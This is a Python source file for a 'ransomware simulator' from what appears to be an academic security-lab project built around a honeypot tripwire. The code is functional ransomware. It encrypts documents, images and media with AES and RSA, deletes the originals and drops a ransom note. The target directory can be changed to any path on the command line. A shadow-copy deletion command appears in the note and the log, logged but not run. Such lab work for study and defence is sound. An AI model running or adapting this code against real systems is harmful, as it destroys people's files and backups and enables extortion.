"""
ransomware/simulator.py  —  Person 2
Ransomware encryption simulator for the IS Lab Kill-Chain project.

Behaviour (alphabetical traversal → hybrid encrypt → ransom note)
------------------------------------------------------------------
 1. Writes own PID to config.SIMULATOR_PID_FILE immediately on startup
    so honeypot_monitor.py can terminate this process when the tripwire fires.
 2. Traverses config.TEST_DATA_DIR in strict alphabetical order (A_COMMAND_ARCHIVE
    sorts first, which ensures the honeypot directory is touched first and the
    tripwire fires as early as possible).
 3. Targets file extensions: .docx .xlsx .pdf .jpg .mp3 .mp4 .txt .png
 4. Per-file hybrid encryption:
      a. Generate a random 32-byte AES-256 session key and 16-byte IV.
      b. AES-256-CBC encrypt the file in-memory using shared.crypto.aes_encrypt.
      c. Wrap the AES key with RSA-2048-OAEP using config.RSA_PUB_KEY_PATH.
      d. Write encrypted content to   <original_path>.locked
      e. Write sidecar key file to    <original_path>.key
         Sidecar format: [16 bytes IV][256 bytes RSA-wrapped AES key]
      f. Delete the original plaintext file.
 5. Drops a README_DECRYPT.txt ransom note in every directory that has at least
    one encrypted file.
 6. Logs the vssadmin shadow-copy deletion command string to the simulator log
    WITHOUT executing it (forensic evidence only).
 7. Every operation is path-checked against config.TEST_DATA_DIR; any path
    escaping that root is silently skipped.
 8. All events are logged as JSON-lines to logs/simulator.log.

Spawn contract (with victim/c2_client.py)
------------------------------------------
  subprocess.Popen([sys.executable, "ransomware/simulator.py"])
  The simulator does NOT open any sockets. It reads config.py and starts
  traversal immediately. No --wait flag is used by default.

Dependencies: cryptography, config.py, shared/crypto.py
"""

from __future__ import annotations

import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# ── Make config and shared importable from any working directory ───────────────
_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import config
from shared.crypto import (
    aes_encrypt,
    generate_aes_key,
    generate_iv,
    rsa_wrap_key,
)

# ──────────────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────────────

TARGET_EXTENSIONS: frozenset[str] = frozenset({
    ".docx", ".xlsx", ".pdf",
    ".jpg",  ".png",
    ".mp3",  ".mp4",
    ".txt",
})

# Displayed in the ransom note
RANSOM_NOTE_CONTENT = """\
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  YOUR FILES HAVE BEEN ENCRYPTED  [SIMULATION — LAB USE ONLY]
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

IMPORTANT: This is a controlled academic simulation for
           Information Security Lab. No real harm is intended.

All files with the extensions .docx .xlsx .pdf .jpg .mp3 .mp4
in this directory have been encrypted with AES-256-CBC.

The unique AES session key for each file has been wrapped with
RSA-2048 and stored in the corresponding .key sidecar file.
Without the RSA private key (held by the attacker) your files
cannot be recovered.

To receive the decryption key, contact:
    attacker@isllab.local  [FICTIONAL — lab demo only]

DO NOT attempt to modify the .locked or .key files.

Shadow copy deletion (logged only — NOT executed in simulation):
    vssadmin delete shadows /all /quiet

[Simulator: ransomware/simulator.py | Project: IS Lab Kill-Chain]
"""

# ──────────────────────────────────────────────────────────────────────────────
# Logging — JSON-lines to logs/simulator.log
# ──────────────────────────────────────────────────────────────────────────────

def _now() -> str:
    return (
        datetime.now(timezone.utc)
        .isoformat(timespec="milliseconds")
        .replace("+00:00", "Z")
    )


def _setup_log(log_dir: str) -> Path:
    p = Path(log_dir)
    p.mkdir(parents=True, exist_ok=True)
    return p / "simulator.log"


_log_path: Path | None = None


def _log(event: str, **fields) -> None:
    record = {"ts": _now(), "module": "simulator", "event": event, **fields}
    line = json.dumps(record) + "\n"
    if _log_path:
        with _log_path.open("a", encoding="utf-8") as fh:
            fh.write(line)
    # Mirror to stdout for real-time observation
    print(f"[simulator] {event}", {k: v for k, v in fields.items()
                                   if k in ("file", "error", "pid", "dirs_touched")})


# ──────────────────────────────────────────────────────────────────────────────
# PID file — lets honeypot_monitor.py kill us cleanly
# ──────────────────────────────────────────────────────────────────────────────

def _write_pid(pid_path: str) -> None:
    """Write own PID to *pid_path* so the honeypot monitor can terminate us."""
    p = Path(pid_path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(str(os.getpid()), encoding="utf-8")
    _log("pid_written", pid=os.getpid(), pid_file=str(p))


def _remove_pid(pid_path: str) -> None:
    try:
        Path(pid_path).unlink(missing_ok=True)
    except OSError:
        pass


# ──────────────────────────────────────────────────────────────────────────────
# Path safety
# ──────────────────────────────────────────────────────────────────────────────

def _safe(path: Path, root: Path) -> bool:
    """Return True only if *path* is strictly under *root*."""
    try:
        path.resolve().relative_to(root.resolve())
        return True
    except ValueError:
        return False


# ──────────────────────────────────────────────────────────────────────────────
# Per-file hybrid encryption
# ──────────────────────────────────────────────────────────────────────────────

def _encrypt_one_file(src: Path, pub_key_path: str) -> bool:
    """
    Hybrid-encrypt *src* in place.

    Steps:
      1. Read original plaintext bytes.
      2. Generate per-file AES-256 key + IV.
      3. AES-CBC encrypt → write <src>.locked
      4. RSA-OAEP wrap the AES key → write <src>.key  (format: IV || wrapped_key)
      5. Remove the original plaintext file.

    Returns True on success, False on any error (errors are logged but non-fatal
    so traversal continues to the next file).
    """
    locked_path = src.with_name(src.name + config.ENCRYPTED_EXT)
    key_path    = src.with_name(src.name + config.KEY_EXT)

    try:
        plaintext = src.read_bytes()
    except OSError as exc:
        _log("read_error", file=str(src), error=str(exc))
        return False

    try:
        aes_key    = generate_aes_key()          # 32 random bytes
        iv         = generate_iv()               # 16 random bytes
        ciphertext = aes_encrypt(plaintext, iv, aes_key)
        wrapped    = rsa_wrap_key(aes_key, pub_key_path)  # 256 bytes (RSA-2048)
    except Exception as exc:
        _log("crypto_error", file=str(src), error=str(exc))
        return False

    try:
        locked_path.write_bytes(ciphertext)
        # Sidecar: 16-byte IV followed by 256-byte RSA-wrapped AES key
        key_path.write_bytes(iv + wrapped)
        src.unlink()
    except OSError as exc:
        _log("write_error", file=str(src), error=str(exc))
        # Attempt cleanup to avoid leaving partial state
        for p in (locked_path, key_path):
            try:
                p.unlink(missing_ok=True)
            except OSError:
                pass
        return False

    _log(
        "file_encrypted",
        file=src.name,
        dir=str(src.parent),
        plaintext_bytes=len(plaintext),
        encrypted_bytes=len(ciphertext),
        locked=locked_path.name,
        key_sidecar=key_path.name,
    )
    return True


# ──────────────────────────────────────────────────────────────────────────────
# Ransom note
# ──────────────────────────────────────────────────────────────────────────────

def _drop_ransom_note(directory: Path) -> None:
    note_path = directory / config.RANSOM_NOTE
    if note_path.exists():
        return  # already dropped in this directory
    try:
        note_path.write_text(RANSOM_NOTE_CONTENT, encoding="utf-8")
        _log("ransom_note_dropped", dir=str(directory))
    except OSError as exc:
        _log("ransom_note_error", dir=str(directory), error=str(exc))


# ──────────────────────────────────────────────────────────────────────────────
# Traversal
# ──────────────────────────────────────────────────────────────────────────────

def run_simulation(
    data_dir: str = config.TEST_DATA_DIR,
    pub_key_path: str = config.RSA_PUB_KEY_PATH,
    pid_file: str | None = None,
) -> dict:
    """
    Traverse *data_dir* alphabetically and encrypt targeted files.

    A_COMMAND_ARCHIVE (the honeypot) sorts before all real data directories
    and will therefore be the first directory touched, guaranteeing the tripwire
    fires as soon as possible.

    Parameters
    ----------
    data_dir     : root of the fictional military dataset
    pub_key_path : RSA public key used to wrap per-file AES keys
    pid_file     : path to write own PID (default: config.SIMULATOR_PID_FILE)

    Returns
    -------
    dict  — summary statistics for logging/evaluation
    """
    global _log_path
    _log_path = _setup_log(config.LOG_DIR)

    pid_path = pid_file or getattr(config, "SIMULATOR_PID_FILE",
                                   str(Path(config.LOG_DIR) / "simulator.pid"))
    _write_pid(pid_path)

    root = Path(data_dir).resolve()
    if not root.is_dir():
        _log("abort_no_data_dir", data_dir=str(root))
        _remove_pid(pid_path)
        return {}

    if not Path(pub_key_path).is_file():
        _log("abort_no_pubkey", pub_key_path=pub_key_path)
        _remove_pid(pid_path)
        return {}

    # ── Log shadow-copy deletion command (NEVER execute) ──────────────────────
    vss_cmd = "vssadmin delete shadows /all /quiet"
    _log("shadow_copy_deletion_logged", command=vss_cmd,
         note="NOT executed — logged for forensic evidence only")
    print(f"\n[simulator] Shadow-copy deletion (LOGGED ONLY): {vss_cmd}\n")

    _log("traversal_starting", data_dir=str(root), pub_key=pub_key_path)

    files_encrypted = 0
    files_skipped   = 0
    dirs_touched: set[str] = set()

    t_start = time.perf_counter()

    # os.walk with sorted dirnames gives strict alphabetical traversal.
    # A_COMMAND_ARCHIVE sorts before 01_Operations, 02_Intelligence, 03_Media.
    for dirpath_str, dirnames, filenames in os.walk(str(root)):
        dirnames.sort()    # alphabetical subdirectory order
        dirpath = Path(dirpath_str).resolve()

        # Hard path-safety check
        if not _safe(dirpath, root):
            _log("path_escape_rejected", dir=str(dirpath))
            continue

        targets_in_dir: list[Path] = []
        for fname in sorted(filenames):
            fp = dirpath / fname
            suffix = fp.suffix.lower()
            # Skip already-encrypted files, key sidecars, and ransom notes
            if (fname.endswith(config.ENCRYPTED_EXT)
                    or fname.endswith(config.KEY_EXT)
                    or fname == config.RANSOM_NOTE):
                continue
            if suffix not in TARGET_EXTENSIONS:
                continue
            if not _safe(fp, root):
                _log("path_escape_rejected", file=str(fp))
                continue
            targets_in_dir.append(fp)

        if not targets_in_dir:
            continue

        for fp in targets_in_dir:
            ok = _encrypt_one_file(fp, pub_key_path)
            if ok:
                files_encrypted += 1
                dirs_touched.add(str(dirpath))
            else:
                files_skipped += 1

        # Drop ransom note in any directory where we encrypted at least one file
        if str(dirpath) in dirs_touched:
            _drop_ransom_note(dirpath)

    elapsed_s = round(time.perf_counter() - t_start, 4)
    summary = {
        "files_encrypted": files_encrypted,
        "files_skipped":   files_skipped,
        "dirs_touched":    len(dirs_touched),
        "elapsed_s":       elapsed_s,
    }
    _log("traversal_complete", **summary)
    print(f"\n[simulator] Done — {files_encrypted} files encrypted in "
          f"{elapsed_s:.2f}s across {len(dirs_touched)} directories.")

    _remove_pid(pid_path)
    return summary


# ──────────────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Ransomware Simulator — IS Lab (Person 2)"
    )
    parser.add_argument(
        "--data-dir",
        default=config.TEST_DATA_DIR,
        help="Root directory to encrypt (default: config.TEST_DATA_DIR)",
    )
    parser.add_argument(
        "--pub-key",
        default=config.RSA_PUB_KEY_PATH,
        help="RSA public key path (default: config.RSA_PUB_KEY_PATH)",
    )
    parser.add_argument(
        "--pid-file",
        default=None,
        help="Where to write the simulator PID (default: logs/simulator.pid)",
    )
    args = parser.parse_args()
    run_simulation(
        data_dir=args.data_dir,
        pub_key_path=args.pub_key,
        pid_file=args.pid_file,
    )
